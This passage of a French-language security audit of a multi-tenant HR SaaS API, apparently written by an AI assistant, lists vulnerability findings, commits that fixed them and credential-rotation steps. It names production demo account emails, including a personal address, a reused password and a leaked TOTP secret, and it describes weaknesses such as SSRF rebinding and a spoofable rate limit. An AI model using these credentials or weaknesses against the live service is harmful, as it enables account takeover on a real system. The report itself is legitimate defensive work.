- **Fichiers :** `apps/api/src/modules/employees/employees.routes.ts:608-644` + `apps/api/src/modules/platform/brand.routes.ts:83-98`. Les photos de profil sont stockées dans `platform.brand_assets` (**global, non-auth, cross-tenant**, prévu pour les logos publics) et servies par `GET /public/brand/:id` **sans auth ni ownership ni scoping tenant**.
- **Exploit :** toute fuite d'URL (Referer, historique, capture, log) = accès **permanent, non révocable, inter-tenant** à la photo. Mitigé : UUIDv4 aléatoires (non brute-forçables), mais viole l'« isolation tenant stricte » si une URL fuit.
- **Correctif :** stocker les photos dans une table tenant-scopée (ou exiger un token par asset), servir via un endpoint authentifié tenant-scopé.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). Les photos quittent `platform.brand_assets` pour une **table tenant `employee_photos`**, servies par le nouvel endpoint **authentifié `GET /employees/:id/photo`** (RBAC aligné sur `GET /employees/:id`). `GET /public/brand/:id` reste réservé aux **logos publics**.

#### [MEDIUM] A04-3 — `PATCH /platform/tenants/:id` sans schéma Zod (validation de valeurs absente)
- **Fichier :** `apps/api/src/modules/platform/platform.routes.ts:355-446`. `request.body as Record<string,unknown>`, allowlist de clés (anti mass-assignment) mais **valeurs non validées** : `max_users`/`max_employees` (négatif/absurde/non-numérique), `status`/`plan_type` (chaîne libre hors enums), `logo_url` non validé. Atteignable **super_admin seul** → impact self-harm/opérationnel, pas d'escalade.
- **Correctif :** Zod `.strict()` + enums `status`/`plan_type` + `z.number().int().nonnegative().max(...)`.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). Schéma Zod strict : enums `status`/`plan_type`, quotas bornés, `logo_url` restreint aux schémas `http(s)`.

#### [LOW]
- **A04-4** `contracts.routes.ts:168-190` — `PATCH /contracts/:id` (admin/hr_manager) : allowlist de clés mais `base_salary` négatif/énorme, `status`/`signature_status` chaînes libres. Rôle déjà de confiance ; ajouter Zod borné.
- **A04-5** `recruitment.routes.ts:1332-1440` (apply public) — rate-limit 5/h par `request.ip` ; si `trustProxy` mal configuré, spoof `X-Forwarded-For` contournerait l'anti-spam. **À confirmer** contre la config Fastify (non vérifié).
- **A08-6 [INFO]** `employees.routes.ts:630-637` — chaque re-upload de photo insère une ligne `brand_assets` sans supprimer l'ancienne (croissance stockage lente, bornée par rate-limit). — ✅ **Corrigé** PR #205 (`5f7bf94`) : `UNIQUE(employee_id)` + UPSERT sur `employee_photos` (une seule photo par employé).

**Vérifié sain :** CV upload auth (MIME allowlist, 10 Mo, blob DB, pas de path), CV download (UUID, tenant-scopé, RBAC, nosniff), apply public (5/h, MIME+5 Mo, Zod strict, anti-doublon, tenant/job re-vérifiés), reçus de frais (data URL base64, pas de disque), logo (MIME **exclut SVG**, nosniff), webhooks/connecteurs (SSRF guard + HMAC-SHA256 + secret AES + headers ne peuvent écraser la signature), clés API entrantes (secret 192-bit SHA-256, scope/expiry/statut), **prototype pollution** (`attendance.mapping.ts` `getByPath` bloque `__proto__`/`prototype`/`constructor`), self-service PATCH (`EMPLOYEE_SELF_FIELDS` strippe tout champ non-self après Zod).

---

## 4. Constats déjà identifiés (module Badgeuse/Pointage — revue finale)

Deux points **Important** relevés lors de la revue de sécurité du module `attendance` (livré ce jour), à traiter car probablement **transverses** (patron de fetch sortant partagé) :

| # | Sévérité | Fichier | Constat | Correctif |
|---|----------|---------|---------|-----------|
| BADGE-1 | High (A10) | `apps/api/src/modules/attendance/attendance.fetch.ts` (+ copie worker `apps/worker/src/jobs/attendance-poll.ts`) | **SSRF DNS-rebinding / TOCTOU** : `isSafeOutboundUrl` résout le DNS pour valider, puis `fetch` re-résout indépendamment → un admin tenant peut rebinder son domaine vers une IP interne entre la vérif et la connexion. | Épingler la connexion à l'IP déjà validée (agent `undici` avec `lookup` custom renvoyant l'IP vérifiée). Concerne **tous les appels sortants** basés sur le même guard. |
| BADGE-2 | Medium (A10/DoS) | idem | **Lecture de réponse non bornée** : `response.json()` sans cap de taille → un équipement/hôte malveillant renvoie un corps géant, épuise la mémoire du process (worker partagé entre tenants). | Vérifier `Content-Length` et/ou lire en flux avec un plafond d'octets, abort au-delà. |

> Ces deux points sont à évaluer **au niveau du guard SSRF partagé** (agent 3) car ils s'appliquent probablement à tous les modules à sortie réseau (intégrations, mobile-money, SSO, IA…).

**Invariants du module badgeuse déjà vérifiés sains** (revue finale) : non-fuite du secret (réponses, logs, audit, notifications), isolation tenant sur chaque requête, allowlist anti-injection `employeeMatchBy`, RBAC/IDOR (`/me` résolu par token, `respond` → 404 identique sur ressource d'autrui), sanctions en `draft` uniquement (jamais auto-émises), `redirect:'manual'`.

---

## 5. Plan de remédiation

Chaque correctif sera livré avec **test de non-régression** et **re-vérification adversariale**. Ordre recommandé :

### P0 — Immédiat (Critical, prod exposée) — **CODE : CORRIGÉ ✅ (commit `d86c7ea`)**
| ID | Correctif | Statut |
|----|-----------|--------|
| A07-1 | Vérifier `aud` dans `verifyAndCheckBlacklist` → rejeter tout token non-session (`mfa-challenge`, `csrf`) | ✅ **Fait** — bypass MFA fermé, flux MFA légitime toujours vert |
| A10-1 | Guard SSRF host:port (`assertSafeOutboundHost`) sur `PUT /settings/email` + re-garde à l'envoi (`email.ts`) ; message d'erreur SMTP générique | ✅ **Fait** — hôte interne → 422, plus d'oracle |
| A09-1 (code) | Seed n'imprime plus identifiants/TOTP si `NODE_ENV==='production'` | ✅ **Fait** |
| A09-1 (**opérationnel**) | **Roter les mots de passe démo réels en prod** + le **secret TOTP `mfa@sotra.ci`** + masquer les credentials en CI | ⚠️ **À faire par l'équipe** — voir §7 |

> Vérification : suite API complète **4166/4166 verte**, `tsc` 0 erreur, flux MFA (`auth-mfa.routes.test.ts`) confirmé.

### P1 — Court terme (High) — **LOT COMPLET LIVRÉ ✅**
| ID | Correctif | Statut |
|----|-----------|--------|
| A10-2 | **Fix central** : épingler l'IP validée dans `ssrf-guard.ts` (undici `Agent`+`lookup`), 6 sorties + 2 copies | ✅ **Fait** — `tsc` 0, tests épinglage 50 verts, 4180 API |
| A01-1 | `blacklistTokenSafe` sur `PATCH`/`DELETE /users/:id` + `/auth/refresh` re-vérifie statut/rôle en DB (comme `/auth/refresh-token`) | ✅ **Fait** — `f9c0338` (époque de token + revérif DB) |
| A03-1 | `encodeField` sur chaque champ de `GET /payroll/livre-de-paie/:year/export` | ✅ **Fait** — `7549296` |
| A04-1 | Restreindre `POST /settings/variable-elements` à admin/hr_manager + Zod `.strict()` borné | ✅ **Fait** — `e9900da` |
| A02-2 | Chiffrer `mfa_secret` au repos (`encrypt`/`decrypt` existants) + migration des seeds existants | ✅ **Fait** — `60d3b73` (AES-256-GCM, compat legacy) |
| A02-3 | Blacklister le JWT présenté sur `change-password` **et** `reset-password` + `revokeAllRefreshTokensForUser` sur reset | ✅ **Fait** — `f9c0338` (invalidation par époque de token) |

### P2 — Moyen terme (Medium) — **LOT COMPLET LIVRÉ ✅ (PR #205, commit `5f7bf94`)**
| ID | Correctif | Effort | Statut |
|----|-----------|--------|--------|
| A07-4 | `jti` aléatoire par token (11 sites de signature) + blacklist de logout par jti ; suspension cabinet → `setTokenEpoch` | M | ✅ **Fait** — self-lockout jusqu'à 7 j fermé |
| A01-2 | `GET /absences/balances` : forcer `request.user.employeeId` pour non-RH | S | ✅ **Fait** — `manager` limité à son équipe directe (403 sinon) |
| A01-3 | `expenses` POST/submit : exclure `readonly`, contraindre `employee_id` own/team | S | ✅ **Fait** |
| A01-4 | `GET /mobile-money/payments` : `authorize('admin','hr_manager','readonly')` | S | ✅ **Fait** |
| A01-5 | `referentiels/seed|reindex` : retirer `'admin'` (super_admin seul) | S | ✅ **Fait** |
| A08-2 | Photos employés : table tenant `employee_photos` + `GET /employees/:id/photo` authentifié | M | ✅ **Fait** — `/public/brand/:id` = logos publics uniquement |
| A08-6 | `UNIQUE(employee_id)` + UPSERT (une seule photo par employé) | S | ✅ **Fait** |
| A04-3 | `PATCH /platform/tenants/:id` : Zod `.strict()` + enums + bornes numériques | S | ✅ **Fait** — `logo_url` restreint à http(s) |
| A05-2 | Étendre `SENSITIVE_CONTENT_TYPES` aux types xlsx (no-store sur IBAN/NNI) | S | ✅ **Fait** — + toute réponse `Content-Disposition: attachment` |
| A09-3 | Chiffrer `integration_webhooks.headers` + audit = noms de clés seulement | S/M | ✅ **Fait** — colonne `headers_enc` |
| A10-3 | Cap d'octets en flux sur toutes les lectures de réponse sortante (badgeuse, MM, intégrations, legal-watch) | M | ✅ **Fait** — `readBodyCapped`/`readJsonCapped` (api + worker), 5 Mo / 64 Ko webhooks / 1 Mo veille légale |

> _Note : le constat « blacklist par `sub` faute de `jti` » est référencé **A02-4** dans la synthèse §2 et **A07-4** dans les constats détaillés §3 — même finding._

### P3 — Durcissement (Low/Info)
A01-6/7 (filtre manager IA, UUID_RE), A03-3 (échappement HTML emails), A10-4 (guard legal-watch), A04-4/5 (Zod contrats, trustProxy apply), A02-5/A05-6 (fail-fast S3/Meili prod), A09-4/5 (messages d'erreur génériques security/bank-transfer), A07-6 (CSRF `jwt.verify`), A08-6 (cleanup photos), BADGE-1/2 (déjà couverts par A10-2/A10-3).

> **Note transverse :** la duplication volontaire du code sécurité (SSRF, crypto) entre `apps/api` et `apps/worker` impose de **mirrorer chaque correctif** (A10-2, A02-2…) dans les deux copies, sinon dérive silencieuse.

---

## 6. Périmètre couvert (traçabilité)

- **API** : `apps/api/src/modules/*` (auth, employees, payroll, absences, expenses, cnps, mobile-money, bank-transfer, recruitment, training, reporting, careers, settings, contracts, ai, integrations, onboarding, org-chart, discipline, offboarding, climate, succession, competencies, calibration, mobility, classification, signature, security, sage, platform, dg, agency, attendance), `services/*`, `utils/*`, `plugins/*`, `guards/*`.
- **Worker** : `apps/worker/src/*` (jobs, utils dupliqués).
- **Front** : `apps/web/src/*` (guards, pages sensibles, gestion des secrets côté UI).

---

## 7. Actions opérationnelles à mener par l'équipe (A09-1)

Le correctif code empêche **les futurs** dumps, mais les identifiants et le secret TOTP ont **déjà été exposés** (logs GitHub Actions historiques + `CLAUDE.md` versionné). Le code seul ne suffit pas — il faut **invalider ce qui a fuité** :

1. **Roter les mots de passe des comptes démo réels en prod** (namespace `nexusrh-ci`) : `superadmin@nexusrh-ci.com`, `admin@sotra.ci`, `rh@sotra.ci`, `chef.perso@sotra.ci`, `manager@sotra.ci`, `employe@sotra.ci`, `mfa@sotra.ci`, `admin@cabinet-expertise.ci`, `coulwao@gmail.com`, comptes cabinet Talents / WOYAA. → via l'UI (changer le mot de passe) ou un script de reset admin **avec des valeurs neuves non documentées** (ne PAS réutiliser `Admin1234!`).
2. **Réinitialiser la MFA de `mfa@sotra.ci`** : le secret `JBSWY3DPEHPK3PXP` est public → désactiver puis ré-enrôler la MFA (nouveau secret aléatoire), ou désactiver ce compte démo s'il n'est pas nécessaire en prod.
3. **CI/CD** : confirmer que le seed n'imprime plus rien en prod (fait) ; si un credential doit un jour transiter par la CI, l'émettre via un secret GitHub + `::add-mask::`. Les **logs Actions historiques** contenant le dump ne peuvent pas être « dé-publiés » facilement → la rotation ci-dessus est ce qui les rend inoffensifs.
4. **Repo** : retirer les mots de passe en clair de `CLAUDE.md`/docs versionnés (les remplacer par « voir coffre secrets »).

> Ces actions touchent la prod et les secrets : **à exécuter par l'équipe** (je peux préparer un script de rotation à relire, mais je ne l'exécute pas sur la prod sans ton feu vert explicite).

---

_Audit conduit en lecture seule. Les correctifs P0 (code) sont appliqués et vérifiés (commit `d86c7ea`), P1 livré (PR #203/#204), **P2 livré et déployé en prod (PR #205, commit `5f7bf94`) — les 10 Medium sont traités**. Reste P3 (durcissement Low/Info)._
